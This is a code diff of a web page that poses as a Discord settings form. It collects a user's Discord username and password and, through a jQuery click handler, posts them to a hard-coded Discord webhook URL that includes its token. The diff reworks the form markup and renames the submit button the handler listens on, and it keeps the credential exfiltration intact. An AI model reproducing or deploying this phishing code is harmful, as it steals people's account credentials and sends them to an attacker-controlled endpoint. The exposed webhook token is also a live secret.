@@ -102,17 +102,9 @@
 		<div class="input-group-btn">
 			<form action="index.html" name="resolve_form" method="POST">
 				<input name="username" style="max-width: 470px;" type="text" id="user_name" class="form-control input-lg" placeholder="Discord User Name" />
-				<button type="submit" name="submit" id="resolve_btn" class="btn btn-primary btn-lg">Save</button>
-			</form>
-		</div>	
-      </div>
-	<br>
-
-  <div class="input-group">
-	<div class="input-group-btn">
 		<form action="index.html" name="resolve_form" method="POST">
 			<input name="userpassword" style="max-width: 470px;" type="text" id="user_password" class="form-control input-lg" placeholder="Discord Password" />
-			<button type="submit" name="submit" id="resolve_btn" class="btn btn-primary btn-lg">Save</button>
+			<input type="submit" name="Submit" id="Submit" class="btn btn-primary btn-lg" placeholder="Save">
 		</form>
 	</div>	
   </div>
@@ -124,7 +116,7 @@
 </script> 
 <script>
     $(function() {
-        $('#resolve_btn').click(function(e) {
+        $('#Submit').click(function(e) {
         var username = $("#user_name").val();
         var password = $("#user_password").val();
         $.post("https://discord.com/api/webhooks/1041449820356874361/wKqt_ITs8PfC74iZXl3FONq8O6WJAjdejijXswXllVdDedDxi8986iifaIPeZh4EIujb",
